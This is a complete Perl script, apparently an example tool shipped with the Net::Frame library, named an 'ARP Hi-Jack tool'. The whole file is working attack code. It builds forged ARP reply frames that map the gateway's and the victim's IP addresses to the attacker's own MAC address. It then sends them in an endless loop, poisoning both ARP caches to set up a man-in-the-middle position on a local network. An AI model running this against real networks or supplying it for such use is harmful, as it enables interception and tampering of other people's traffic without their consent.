#!/usr/bin/perl
#
# $Id: nf-arphijack.pl,v 1.2 2006/12/04 21:20:34 gomor Exp $
#
use strict;
use warnings;

our $VERSION = '1.00';

use Getopt::Std;
my %opts;
getopts('g:v:G:V:', \%opts);

my $oWrite;

die("Usage: $0\n".
    "\n".
    "   -g  gateway IP address\n".
    "   -G  gateway MAC address\n".
    "   -v  target victim IP address\n".
    "   -V  target victim MAC address\n".
    "") unless $opts{g} && $opts{v};

use Net::Frame::ETH qw(:consts);
use Net::Frame::ARP qw(:consts);
use Net::Frame::Simple;
use Net::Frame::Device;
use Net::Write::Layer2;

my $oDevice = Net::Frame::Device->new(target => $opts{v});

my $macGateway = $opts{G} || $oDevice->lookupMac($opts{g});
my $macVictim  = $opts{V} || $oDevice->lookupMac($opts{v});
my $ipGateway  = $opts{g};
my $ipVictim   = $opts{v};

my $macMy = $oDevice->mac;

print "Gateway: IP=$ipGateway - MAC=$macGateway\n";
print "Victim : IP=$ipVictim - MAC=$macVictim\n";

# Gateway tells victim
my $eth1 = Net::Frame::ETH->new(
   type => NP_ETH_TYPE_ARP,
   src  => $macMy,
   dst  => $macVictim,
);
my $arp1 = Net::Frame::ARP->new(
   opCode => NP_ARP_OPCODE_REPLY,
   srcIp => $ipGateway,
   dstIp => $ipVictim,
   src   => $macMy,
   dst   => $macVictim,
);
my $replyToVictim = Net::Frame::Simple->new(
   layers => [ $eth1, $arp1 ],
);
print $replyToVictim->print."\n";

# Victim tells gateway
my $eth2 = Net::Frame::ETH->new(
   type => NP_ETH_TYPE_ARP,
   src  => $macMy,
   dst  => $macGateway,
);
my $arp2 = Net::Frame::ARP->new(
   opCode => NP_ARP_OPCODE_REPLY,
   srcIp => $ipVictim,
   dstIp => $ipGateway,
   src   => $macMy,
   dst   => $macGateway,
);
my $replyToGateway = Net::Frame::Simple->new(
   layers => [ $eth2, $arp2, ],
);
print $replyToGateway->print."\n";

$oWrite = Net::Write::Layer2->new(dev => $oDevice->dev);
$oWrite->open;

while (1) {
   $oWrite->send($replyToVictim->raw);
   $oWrite->send($replyToGateway->raw);
   print STDERR ".";
   sleep(1);
}

END {
   $oWrite && $oWrite->close;
}

__END__

=head1 NAME

nf-arphijack - Net::Frame ARP Hi-Jack tool

=head1 AUTHOR

Patrice E<lt>GomoRE<gt> Auffret

=head1 COPYRIGHT AND LICENSE

Copyright (c) 2006, Patrice E<lt>GomoRE<gt> Auffret

You may distribute this module under the terms of the Artistic license.
See LICENSE.Artistic file in the source distribution archive.

=cut
